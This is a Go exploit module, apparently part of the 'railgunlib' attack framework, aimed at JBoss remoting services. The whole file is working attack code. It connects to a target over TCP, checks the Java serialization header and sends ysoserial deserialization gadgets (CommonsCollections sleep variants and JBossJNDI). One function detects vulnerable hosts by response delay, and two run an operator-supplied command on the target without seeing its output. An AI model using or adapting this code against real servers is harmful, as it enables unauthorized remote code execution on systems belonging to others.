package exp_Jboss

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net"
	"strings"
	"time"
)

func socketRead(conn net.Conn, timeout time.Duration) []byte {
	buffer := make([]byte, 8192)
	result := make([]byte, 0)

	for {
		conn.SetReadDeadline(time.Now().Add(timeout))
		bufLen, err := conn.Read(buffer)
		if err != nil || bufLen == 0 {
			break
		}
		result = append(result, buffer[:bufLen]...)
	}
	return result
}

type Exp_202204_RPC struct {
	exp_templates.ExpTemplate
}

func (self *Exp_202204_RPC) Attack_check1() (expResult exp_model.ExpResult) {
	// 默认配置
	deserMagicTags := []byte{0xac, 0xed, 0x00, 0x05}
	remotingMagic := []byte{0x77, 0x01, 0x16, 0x79}

	conn, err := net.DialTimeout("tcp", self.Params.BaseParam.Target, time.Millisecond*time.Duration(self.Params.Settings.Timeout))
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	magicHeader := make([]byte, 4)
	_, err = conn.Read(magicHeader)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if !bytes.Equal(deserMagicTags, magicHeader) {
		self.EchoErrMsg(fmt.Sprintf("magic header is error: %s", hex.EncodeToString(magicHeader)))
		return
	}
	self.EchoSuccessMsg(fmt.Sprintf("recv magic header: %s", hex.EncodeToString(magicHeader)))

	// 构造payload
	gadgetName := "CommonsCollectionsK1Sleep"
	if strings.Contains(self.MustGetStringParam("gadget"), "K2") {
		gadgetName = "CommonsCollectionsK2Sleep"
	}
	payload := gadgets.YsoserialPayloadGenerator(gadgetName, "")
	payload = append(remotingMagic, payload[4:]...)
	_, err = conn.Write(deserMagicTags)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	_, err = conn.Write(payload)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	start := time.Now()
	socketRead(conn, time.Millisecond*time.Duration(self.Params.Settings.Timeout)+time.Second*10)
	end := time.Now().Sub(start)
	self.EchoSuccessMsg(fmt.Sprintf("sleep响应时间: %v", end))
	sleepTime := end.Milliseconds()

	if sleepTime > 8000 && sleepTime < 12000 {
		self.EchoSuccessMsg("漏洞存在")
		self.EchoSuccessMsg("Host: " + self.Params.BaseParam.Target)
	} else {
		self.EchoErrMsg("漏洞不存在")

	}
	return
}

func (self *Exp_202204_RPC) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	deserMagicTags := []byte{0xac, 0xed, 0x00, 0x05}
	remotingMagic := []byte{0x77, 0x01, 0x16, 0x79}

	conn, err := net.DialTimeout("tcp", self.Params.BaseParam.Target, time.Millisecond*time.Duration(self.Params.Settings.Timeout))
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	magicHeader := make([]byte, 4)
	_, err = conn.Read(magicHeader)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if !bytes.Equal(deserMagicTags, magicHeader) {
		self.EchoErrMsg(fmt.Sprintf("magic header is error: %s", hex.EncodeToString(magicHeader)))
		return
	}
	self.EchoSuccessMsg(fmt.Sprintf("recv magic header: %s", hex.EncodeToString(magicHeader)))

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), self.MustGetStringParam("cmd"))
	payload = append(remotingMagic, payload[4:]...)
	_, err = conn.Write(deserMagicTags)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	_, err = conn.Write(payload)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	socketRead(conn, time.Millisecond*time.Duration(self.Params.Settings.Timeout))
	self.EchoSuccessMsg("无回显，执行检查")

	return
}

func (self *Exp_202204_RPC) Attack_cmd2() (expResult exp_model.ExpResult) {
	// 默认配置
	deserMagicTags := []byte{0xac, 0xed, 0x00, 0x05}
	remotingMagic := []byte{0x77, 0x01, 0x16, 0x79}

	conn, err := net.DialTimeout("tcp", self.Params.BaseParam.Target, time.Millisecond*time.Duration(self.Params.Settings.Timeout))
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	magicHeader := make([]byte, 4)
	_, err = conn.Read(magicHeader)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	if !bytes.Equal(deserMagicTags, magicHeader) {
		self.EchoErrMsg(fmt.Sprintf("magic header is error: %s", hex.EncodeToString(magicHeader)))
		return
	}
	self.EchoSuccessMsg(fmt.Sprintf("recv magic header: %s", hex.EncodeToString(magicHeader)))

	// 构造payload
	payload := gadgets.YsoserialPayloadGenerator("JBossJNDI", self.MustGetStringParam("cmd"))
	payload = append(remotingMagic, payload[4:]...)
	_, err = conn.Write(deserMagicTags)
	if err != nil {
		expResult.Err = err.Error()
		return
	}
	_, err = conn.Write(payload)
	if err != nil {
		expResult.Err = err.Error()
		return
	}

	socketRead(conn, time.Millisecond*time.Duration(self.Params.Settings.Timeout))
	self.EchoSuccessMsg("无回显，执行检查")

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_202204_RPC{}, "exp_202204_RPC.yml")

}
